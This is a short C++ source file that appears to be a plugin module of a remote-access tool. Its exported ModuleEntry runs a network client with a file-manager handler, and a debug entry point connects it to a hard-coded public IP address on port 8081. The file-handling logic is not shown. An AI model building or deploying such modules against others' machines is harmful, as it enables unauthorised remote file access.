#include "IOCPClient.h"
#include "Manager.h"
#include "FileManager.h"

extern "C" __declspec(dllexport) void  ModuleEntry(char* szServerAddr, 
	unsigned short uPort, DWORD dwParam = 0){
	
	CIOCPClient *pClient = new CIOCPClient(szServerAddr, uPort);
	CMsgHandler *pHandler = new CFileManager(pClient);

	pClient->Run();

	delete pHandler;
	delete pClient;
}

#ifdef _DEBUG
int main(){
	CIOCPClient::SocketInit();
	ModuleEntry("49.235.129.40", 8081);
	CIOCPClient::SocketTerm(); 
}
#endif